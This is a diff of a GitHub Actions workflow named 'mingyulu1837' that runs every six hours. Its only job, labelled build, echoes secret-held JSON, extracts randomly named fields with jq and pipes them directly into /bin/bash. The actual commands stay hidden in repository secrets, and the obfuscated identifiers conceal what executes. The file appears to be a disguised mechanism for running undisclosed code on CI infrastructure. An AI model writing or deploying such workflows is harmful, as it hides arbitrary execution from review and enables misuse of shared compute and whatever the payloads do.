@@ -3,7 +3,8 @@ name: mingyulu1837
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 0/6 * * *'
+    - cron: '38 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,16 +12,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          qm24: ${{ secrets.qm24 }}
+          mnfx80145: ${{ secrets.mnfx80145 }}
         run: |
-          echo $qm24 | jq -r .ssvvv56501 | /bin/bash
-          echo $trb699 | jq -r .lrqv2861 | /bin/bash
-          echo $wubv1 | jq -r .cs80349 | /bin/bash
-          echo $fbnsx42189 | jq -r .bi06259 | /bin/bash
-          echo $y15 | jq -r .x26 | /bin/bash
-          echo $kiekj71166 | jq -r .qtv06 | /bin/bash
-          echo $xyqk809 | jq -r .iz23389 | /bin/bash
-          echo $xp3 | jq -r .n2155 | /bin/bash
-          echo $wimlo6296 | jq -r .pt111 | /bin/bash
-          echo $fq99 | jq -r .zp3 | /bin/bash
+          echo $mnfx80145 | jq -r .trqmp8 | /bin/bash
+          echo $okitr8 | jq -r .ka45 | /bin/bash
+          echo $ykvdk643 | jq -r .cw1 | /bin/bash
 
